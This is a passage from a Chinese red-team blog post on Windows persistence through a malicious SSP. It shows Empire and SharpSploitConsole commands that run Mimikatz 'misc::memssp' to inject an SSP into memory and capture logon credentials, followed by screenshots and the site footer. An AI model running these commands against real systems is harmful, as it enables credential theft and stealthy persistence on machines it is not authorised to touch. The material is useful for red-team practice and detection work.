</span></span><span style="display:flex;"><span><span style="color:#58a1dd">execute</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111133839474-1905556008.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133839474-1905556008.png" alt=" Empire SSP安装" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133839474-1905556008.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133839474-1905556008.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133839474-1905556008.png?size=large 2x" data-title=" Empire SSP安装" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>Empire还支持可以执行自定义Mimikatz命令的脚本。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">usemodule</span> <span style="color:#58a1dd">credentials</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">mimikatz</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">command</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">set</span> <span style="color:#58a1dd">Command</span> <span style="color:#58a1dd">misc</span>::<span style="color:#58a1dd">memssp</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">execute</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111133858316-1276814399.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133858316-1276814399.png" alt="Mimikatz – SSP命令" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133858316-1276814399.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133858316-1276814399.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133858316-1276814399.png?size=large 2x" data-title="Mimikatz – SSP命令" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>Empire还支持在进程的内存中注入恶意SSP。下面的模块将调用Mimikatz脚本并直接执行memssp命令，作为使该技术自动化的另一种方法。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">usemodule</span> <span style="color:#58a1dd">persistence</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">misc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">memssp</span><span style="color:#ff636f">*</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">execute</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111133913930-1307143695.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133913930-1307143695.png" alt="Empire – memssp" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133913930-1307143695.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133913930-1307143695.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133913930-1307143695.png?size=large 2x" data-title="Empire – memssp" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h1 id="sharpsploitconsole" class="heading-element"><span>SharpSploitConsole</span>
  <a href="#sharpsploitconsole" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>Mimikatz已集成到<a href="https://github.com/anthemtotheego/SharpSploitConsole"target="_blank" rel="external nofollow noopener noreferrer">SharpSploitConsole中</a>，该应用程序旨在与<a href="https://twitter.com/cobbr_io/"target="_blank" rel="external nofollow noopener noreferrer">Ryan Cobb</a>发布的<a href="https://github.com/cobbr/SharpSploit"target="_blank" rel="external nofollow noopener noreferrer">SharpSploit</a>进行交互。SharpSploit是一个.NET后期开发库，具有与PowerSploit类似的功能。当前，SharpSploitConsole通过Mimikatz模块支持内存技术。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">SharpSploitConsole_x64</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">exe</span> <span style="color:#58a1dd">Interact</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Mimi</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">Command</span> <span style="color:#58a1dd">misc</span>::<span style="color:#58a1dd">memssp</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111134004640-661005304.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134004640-661005304.png" alt="img" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134004640-661005304.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134004640-661005304.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134004640-661005304.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="Updated on 2024-08-16 08:31:01">Updated on 2024-08-16&nbsp;</span>
      </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span></span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E6%94%BB%E9%98%B2/" class="post-tag" title="Tags - 攻防">攻防</a><a href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="post-tag" title="Tags - 权限维持">权限维持</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E5%8E%9F%E7%90%86/1/" class="post-nav-item" rel="prev" title="代理开发学习"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>代理开发学习</a>
      <a href="/posts/%E6%94%BB%E9%98%B2/%E6%82%84%E6%82%84%E8%BF%9B%E6%9D%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/68/" class="post-nav-item" rel="next" title="权限维持-计划任务">权限维持-计划任务<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
    <a href="https://statcounter.com/p13160737/?guest=1" target="_blank">全平台总访问统计</a>

<script type="text/javascript">
var sc_project=13160737;
var sc_invisible=0;
var sc_security="28c44c5c";
var scJsHost = "https://";
document.write("<sc"+"ript type='text/javascript' src='" + scJsHost +
"statcounter.com/counter/counter.js'></"+"script>");
</script>

<noscript>
  <div class="statcounter">
    <a title="Web Analytics" href="https://statcounter.com/" target="_blank">
      <img class="statcounter"
           src="https://c.statcounter.com/13160737/0/28c44c5c/0/"
           alt="Web Analytics"
           referrerPolicy="no-referrer-when-downgrade">
    </a>
  </div>
</noscript>


    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">
              <a href="/">东隅</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
</html>
